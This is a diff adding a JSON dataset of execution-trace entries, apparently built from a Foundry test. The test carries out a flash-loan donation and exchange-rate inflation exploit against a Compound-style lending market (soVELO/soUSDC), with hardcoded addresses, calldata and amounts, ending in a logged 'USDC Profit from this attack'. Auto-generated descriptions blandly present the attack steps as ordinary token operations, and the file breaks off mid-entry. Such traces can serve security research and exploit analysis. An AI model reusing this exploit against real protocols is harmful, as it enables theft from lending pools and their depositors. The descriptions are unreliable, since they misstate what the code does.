@@ -1,0 +1,989 @@
+[
+    {
+        "id": "1276342",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        // 1. Execute proposals\n\n        bytes memory data1 = hex\"fca7820b0000000000000000000000000000000000000000000000000429d069189e0000\";\n\n        bytes memory data2 = hex\"f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e\";\n\n        bytes memory data3 = hex\"55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea\";\n\n        bytes memory data4 = hex\"a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5\";\n\n        bytes memory data5 =\n            hex\"e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000\";\n\n        t.execute(\n            soVELO,\n            0,\n            data1,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c\n        );\n\n        t.execute(\n            soVELO,\n            0,\n            data2,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data3,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data4,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data5,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed\n        );\n\n        // 2. Approve VELO to soVEOLO\n\n        IERC20(VELO_Token_V2).approve(soVELO, type(uint256).max);\n\n        // 3. FlashLoan\n\n        VolatileV2Pool(VolatileV2_USDC_VELO).swap(0, 35_469_150_965_253_049_864_450_449, address(this), hex\"01\");\n    }\n\n",
+        "description": "1. Core functions:  \nThe `testExploit` function is designed to perform a series of actions that simulate an exploit scenario. It first executes multiple proposals by calling the `execute` function with specific data and parameters. These proposals likely interact with certain contracts or systems. After executing the proposals, it approves a maximum amount of a token (VELO) to be used by another contract (soVELO). Finally, it initiates a flash loan by swapping tokens in a specific pool, which could be part of a larger strategy or exploit.\n\n2. Security mechanism:  \nThe function does not explicitly include security mechanisms like access control or input validation. However, it relies on the underlying `execute` and `approve` functions, which may have their own security checks. The use of `type(uint256).max` for approval is a common pattern but can be risky if not handled carefully. The function also interacts with external contracts (e.g., `VolatileV2Pool`), so its security depends on the trustworthiness of those contracts.\n\n3. Parameter Function:  \nThe function does not take any parameters directly. However, it uses predefined data (`data1`, `data2`, etc.) and specific values (e.g., `soVELO`, `Unitroller`, `VELO_Token_V2`) to interact with external contracts. These values are hardcoded and represent addresses or configurations necessary for the function's operations. The `execute` function is called with parameters like contract addresses, data payloads, and additional values (e.g., `0x0000000000000000000000000000000000000000000000000000000000000000`), which are likely used for specific contract interactions.\n\n4. Return description:  \nThe function does not return any value. Its purpose is to execute a sequence of actions rather than compute and return a result. The effects of the function are external, such as changes in contract states or token balances, rather than an internal calculation or output.\n\nIn summary,  \nThe `testExploit` function is a script-like function that executes a series of predefined actions, including proposal executions, token approvals, and a flash loan swap. It lacks explicit security mechanisms but relies on the security of the underlying contracts it interacts with. The function uses hardcoded data and parameters to perform its tasks and does not return any value, focusing instead on external effects.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "85500",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 0, 0xfca7820b0000000000000000000000000000000000000000000000000429d069189e0000, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c",
+        "original_code": "    function execute(\n        address target,\n        uint256 value,\n        bytes calldata data,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {\n        bytes32 id = hashOperation(target, value, data, predecessor, salt);\n        _beforeCall(id, predecessor);\n        _call(id, 0, target, value, data);\n        _afterCall(id);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `execute` function is designed to perform a specific operation on a target contract. It takes details like the target address, the value to send, the data to pass, and some additional identifiers (predecessor and salt) to execute a transaction. The function ensures that the operation is properly prepared, executed, and finalized by calling helper functions (`_beforeCall`, `_call`, and `_afterCall`).\n\n2. **Security mechanism**:  \n   The function uses the `onlyRoleOrOpenRole(EXECUTOR_ROLE)` modifier, which ensures that only accounts with the `EXECUTOR_ROLE` or an open role can call this function. This restricts unauthorized access and ensures that only trusted entities can execute operations. Additionally, the function is marked as `payable`, allowing it to handle Ether transfers securely.\n\n3. **Parameter Function**:  \n   - `target`: The address of the contract where the operation will be executed.  \n   - `value`: The amount of Ether (in Wei) to send with the transaction.  \n   - `data`: The encoded function call or data to pass to the target contract.  \n   - `predecessor`: A unique identifier for the operation, used to track dependencies or order.  \n   - `salt`: A random value to ensure the operation\u2019s uniqueness and prevent replay attacks.  \n\n4. **Return description**:  \n   The function does not return any value directly. Instead, it focuses on executing the operation on the target contract. It generates a unique identifier (`id`) for the operation using the `hashOperation` function, which combines all the input parameters. This `id` is used to track the operation before, during, and after execution.  \n\n**In summary**, the `execute` function is a secure and structured way to perform operations on a target contract. It ensures only authorized users can call it, handles Ether transfers, and uses unique identifiers to manage and track each operation.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "70000",
+        "args": "300000000000000000 [3e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "7229",
+        "args": "0, 0, 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000002f40535f"
+    },
+    {
+        "id": "14397",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 0, 0xf2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3397",
+        "args": "0x7320bD5fA56F8a7Ea959a425F0C0b8cAc56F741E",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "291",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "27842",
+        "args": "0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0x55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea, 0x0000000000000000000000000000000000000000000000000000000000000000, 0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "14342",
+        "args": "0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "9153",
+        "args": "0x22C7e5Ce392BC951f63B68a8020B121A8E1C0Fea",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "144582",
+        "args": "0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0xa76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "133582",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "132893",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "333",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "73092",
+        "args": "0x60CF091cD3f50420d50fD7f707414d0DF4751C58, 0, 0xe4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000, 0x0000000000000000000000000000000000000000000000000000000000000000, 0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "61814",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 350000000000000000 [3.5e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "61109",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 350000000000000000 [3.5e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "35336",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "124601260000000000 [1.246e17]"
+    },
+    {
+        "id": "3309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soVELO\""
+    },
+    {
+        "id": "5595",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "253",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "11235",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]"
+    },
+    {
+        "id": "7502",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294"
+    },
+    {
+        "id": "24673",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "878119",
+        "args": "0, 35469150965253049864450449 [3.546e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01",
+        "original_code": "    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external nonReentrant {\n        if (IPoolFactory(factory).isPaused()) revert IsPaused();\n        if (amount0Out == 0 && amount1Out == 0) revert InsufficientOutputAmount();\n        (uint256 _reserve0, uint256 _reserve1) = (reserve0, reserve1);\n        if (amount0Out >= _reserve0 || amount1Out >= _reserve1) revert InsufficientLiquidity();\n\n        uint256 _balance0;\n        uint256 _balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            (address _token0, address _token1) = (token0, token1);\n            if (to == _token0 || to == _token1) revert InvalidTo();\n            if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0) IPoolCallee(to).hook(_msgSender(), amount0Out, amount1Out, data); // callback, used for flash loans\n            _balance0 = IERC20(_token0).balanceOf(address(this));\n            _balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint256 amount0In = _balance0 > _reserve0 - amount0Out ? _balance0 - (_reserve0 - amount0Out) : 0;\n        uint256 amount1In = _balance1 > _reserve1 - amount1Out ? _balance1 - (_reserve1 - amount1Out) : 0;\n        if (amount0In == 0 && amount1In == 0) revert InsufficientInputAmount();\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            (address _token0, address _token1) = (token0, token1);\n            if (amount0In > 0) _update0((amount0In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); // accrue fees for token0 and move them out of pool\n            if (amount1In > 0) _update1((amount1In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); // accrue fees for token1 and move them out of pool\n            _balance0 = IERC20(_token0).balanceOf(address(this)); // since we removed tokens, we need to reconfirm balances, can also simply use previous balance - amountIn/ 10000, but doing balanceOf again as safety check\n            _balance1 = IERC20(_token1).balanceOf(address(this));\n            // The curve, either x3y+y3x for stable pools, or x*y for volatile pools\n            if (_k(_balance0, _balance1) < _k(_reserve0, _reserve1)) revert K();\n        }\n\n        _update(_balance0, _balance1, _reserve0, _reserve1);\n        emit Swap(_msgSender(), to, amount0In, amount1In, amount0Out, amount1Out);\n    }\n\n    // force balances to match reserves\n",
+        "description": "1. Core functions:  \nThe `swap` function is designed to facilitate the exchange of two tokens within a liquidity pool. It allows users to swap one token for another by specifying the amounts they wish to receive (`amount0Out` and `amount1Out`). The function ensures that the pool has sufficient liquidity to handle the swap, transfers the tokens to the recipient, and updates the pool's reserves accordingly. Additionally, it supports a callback mechanism for advanced use cases like flash loans.\n\n2. Security mechanism:  \n- **`nonReentrant` modifier**: Prevents reentrancy attacks by ensuring the function cannot be called again before it completes.  \n- **Pause check**: Verifies that the pool is not paused using `IPoolFactory(factory).isPaused()`.  \n- **Input validation**: Ensures that at least one of `amount0Out` or `amount1Out` is non-zero and that the requested amounts do not exceed the pool's reserves.  \n- **Invalid recipient check**: Prevents tokens from being sent to the token addresses themselves.  \n- **Fee calculation and reserve updates**: Accrues fees and updates reserves to maintain the pool's integrity.  \n- **K invariant check**: Ensures the pool's mathematical invariant (`_k`) is maintained after the swap to prevent manipulation.  \n\n3. Parameter Function:  \n- **`amount0Out` and `amount1Out`**: Specify the amounts of the two tokens the user wants to receive from the pool.  \n- **`to`**: The address that will receive the swapped tokens.  \n- **`data`**: Optional data used for advanced features like flash loans, passed to a callback function if provided.  \n\n4. Return description:  \nThe function does not return a value directly but performs several critical operations:  \n- Transfers the specified amounts of tokens to the recipient.  \n- Calculates the amounts of tokens added to the pool (`amount0In` and `amount1In`) based on the updated balances.  \n- Accrues fees and updates the pool's reserves.  \n- Emits a `Swap` event to log the transaction details, including the sender, recipient, and amounts involved.  \n\nIn summary,  \nThe `swap` function enables token exchanges within a liquidity pool while ensuring security through reentrancy protection, input validation, and invariant checks. It handles token transfers, fee calculations, and reserve updates, and supports advanced features like flash loans through a callback mechanism.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "875420",
+        "args": "0, 35469150965253049864450449 [3.546e25], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x01",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2399",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "29794",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 35469150965253049864450449 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "734109",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 35469150965253049864450449 [3.546e25], 0x01",
+        "original_code": "    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        // 4. Mint 2 wei soVELO\n        CErc20Interface(soVELO).mint(400_000_001);\n\n        uint256 Velo_amount_of_soVelo = IERC20(VELO_Token_V2).balanceOf(soVELO);\n\n        console.log(\"Amount of VELO OF soVELO after minting\", Velo_amount_of_soVelo);\n\n        console.log(\"Amount of soVELO been mint\", IERC20(soVELO).balanceOf(address(this)));\n\n        // 5. Transfer All VELO_Token_V2 to soVELO\n\n        uint256 VeloAmountOfthis = IERC20(VELO_Token_V2).balanceOf(address(this));\n\n        IERC20(VELO_Token_V2).transfer(soVELO, VeloAmountOfthis);\n\n        uint256 Velo_amount_of_soVelo_after_transfer = IERC20(VELO_Token_V2).balanceOf(soVELO);\n\n        console.log(\"Amount of VELO OF soVELO after tranfer\", Velo_amount_of_soVelo_after_transfer);\n\n        // 6. Enter Market\n\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = soUSDC;\n        cTokens[1] = soVELO;\n\n        IUnitroller(Unitroller).enterMarkets(cTokens);\n\n        CErc20Interface(soUSDC).borrow(768_947_220_961);\n\n        uint256 usdc_amount_after_borrow = IERC20(USDC).balanceOf(address(this));\n\n        console.log(\"usdc_amount_after_borrow\", usdc_amount_after_borrow);\n\n        // 7. Redeem\n\n        // uint256 Amount_redeemAllowed = ICointroller(Unitroller).redeemAllowed(soVELO,address(this),2);\n\n        ICErc20Delegate(soVELO).redeemUnderlying(Velo_amount_of_soVelo_after_transfer - 1);\n\n        // ICErc20Delegate(soVELO).redeemUnderlying(1);\n\n        uint256 Velo_amount_of_Attacker_after_redeem = IERC20(VELO_Token_V2).balanceOf(address(this));\n\n        console.log(\"Velo_amount_of_Attacker_after_redeem\", Velo_amount_of_Attacker_after_redeem);\n\n        // // 8. LiquidateBorrow\n\n        // ICErc20Delegate(soUSDC).liquidateBorrow(address(this), 4651761644569103, soVELO);\n\n        // 9. Repay FlashLoan\n\n        IERC20(VELO_Token_V2).transfer(VolatileV2_USDC_VELO, amount1 - 1);\n\n        // 10. Repay FlashLoan Fee with USDC\n\n        IERC20(USDC).transfer(VolatileV2_USDC_VELO, 44_656_863_632);\n\n        // 11. Check profit from this attack\n\n        uint256 Profit = IERC20(USDC).balanceOf(address(this));\n\n        console.log(\"---------------------------------------------------\");\n\n        console.log(\"USDC Profit from this attack: $\", Profit / 10 ** 6);\n\n        console.log(\"---------------------------------------------------\");\n    }\n",
+        "description": "1. Core functions:  \nThe `hook` function is designed to perform a series of operations involving token minting, transferring, borrowing, and redeeming. It starts by minting a specific amount of `soVELO` tokens, then transfers all `VELO_Token_V2` tokens held by the contract to `soVELO`. After entering a market, it borrows a large amount of `USDC`, redeems underlying tokens, and finally repays a flash loan and its fee. The function also calculates and logs the profit in `USDC` from these operations.\n\n2. Security mechanism:  \nThe function does not explicitly include security modifiers like `onlyOwner` or `nonReentrant`, which are commonly used to restrict access or prevent reentrancy attacks. However, it relies on external contract calls (e.g., `CErc20Interface`, `IUnitroller`, `ICErc20Delegate`) to handle token operations, which may have their own security measures. The function logs key steps for transparency, but additional safeguards like input validation or access control could enhance security.\n\n3. Parameter Function:  \nThe function takes four parameters:  \n- `sender`: The address initiating the transaction.  \n- `amount0` and `amount1`: Values representing amounts of tokens involved in the operation.  \n- `data`: Additional data passed to the function, though it is not used in the current implementation.  \nThese parameters are primarily used for tracking and transferring specific token amounts, such as repaying a flash loan (`amount1`).\n\n4. Return description:  \nThe function does not return any value. Instead, it performs a series of operations and logs the results, such as token balances and profit calculations. For example, it calculates the profit in `USDC` by checking the balance of `USDC` tokens held by the contract after all operations are completed. This profit is then logged for reference.\n\nIn summary, the `hook` function orchestrates a complex sequence of token-related operations, including minting, transferring, borrowing, and redeeming, while logging key metrics like token balances and profit. While it lacks explicit security mechanisms, it relies on external contracts for token handling. The function\u2019s parameters are used to manage token amounts and track the transaction initiator, and it logs results instead of returning a value.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "174532",
+        "args": "400000001 [4e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "88943",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "88242",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "39247",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "32001",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2642",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "8623",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "7895",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "642",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "23543",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 400000001 [4e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "400000001 [4e8]"
+    },
+    {
+        "id": "3459",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8], 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2825",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000001 [4e8], 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "400000001 [4e8]"
+    },
+    {
+        "id": "0",
+        "args": "\"Amount of VELO OF soVELO after minting\", 400000001 [4e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "642",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2"
+    },
+    {
+        "id": "0",
+        "args": "\"Amount of soVELO been mint\", 2",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "563",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049464450448 [3.546e25]"
+    },
+    {
+        "id": "3094",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5, 35469150965253049464450448 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450449 [3.546e25]"
+    },
+    {
+        "id": "0",
+        "args": "\"Amount of VELO OF soVELO after tranfer\", 35469150965253049864450449 [3.546e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "119916",
+        "args": "[0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[0, 0]"
+    },
+    {
+        "id": "119182",
+        "args": "[0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "[0, 0]"
+    },
+    {
+        "id": "289677",
+        "args": "768947220961 [7.689e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "2585",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1046005468588 [1.046e12]"
+    },
+    {
+        "id": "11103",
+        "args": "1046005468588 [1.046e12], 4788816651334 [4.788e12], 1342598213 [1.342e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x00000000000000000000000000000000000000000000000000000000947914da"
+    },
+    {
+        "id": "149629",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "148928",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 768947220961 [7.689e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "35470",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1000131720000000000000000000000 [1e30]"
+    },
+    {
+        "id": "3309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soUSDC\""
+    },
+    {
+        "id": "5618",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "276",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "11143",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]"
+    },
+    {
+        "id": "7410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901"
+    },
+    {
+        "id": "8751",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 0, 0, 219145563753097 [2.191e14]"
+    },
+    {
+        "id": "585",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1046005468588 [1.046e12]"
+    },
+    {
+        "id": "12470",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
+        "original_code": null,
+        "description": null,
+        "return_value": "1000131720000000000000000000000 [1e30]"
+    },
+    {
+        "id": "1309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soUSDC\""
+    },
+    {
+        "id": "1118",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "276",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "3143",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709554517 [1.844e19], 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 18446744073709554517 [1.844e19]"
+    },
+    {
+        "id": "1410",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2901, 100013172 [1e8], 1715720493 [1.715e9], 1715720493 [1.715e9], 2901"
+    },
+    {
+        "id": "4729",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0, 2, 0, 17734575482626524932225224500000000000000000 [1.773e43]"
+    },
+    {
+        "id": "563",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "35469150965253049864450449 [3.546e25]"
+    },
+    {
+        "id": "12336",
+        "args": "0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5",
+        "original_code": null,
+        "description": null,
+        "return_value": "124601260000000000 [1.246e17]"
+    },
+    {
+        "id": "1309",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"soVELO\""
+    },
+    {
+        "id": "1095",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "253",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "8"
+    },
+    {
+        "id": "3235",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18446744073709553910 [1.844e19], 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 18446744073709553910 [1.844e19]"
+    },
+    {
+        "id": "1502",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2294, 12460126 [1.246e7], 1715723663 [1.715e9], 1715723663 [1.715e9], 2294"
+    },
+    {
+        "id": "362",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "1131576108522846970 [1.131e18]"
+    },
+    {
+        "id": "429",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4788820420824 [4.788e12]"
+    },
+    {
+        "id": "10406",
+        "args": "0xEC8FEa79026FfEd168cCf5C627c7f486D77b765F",
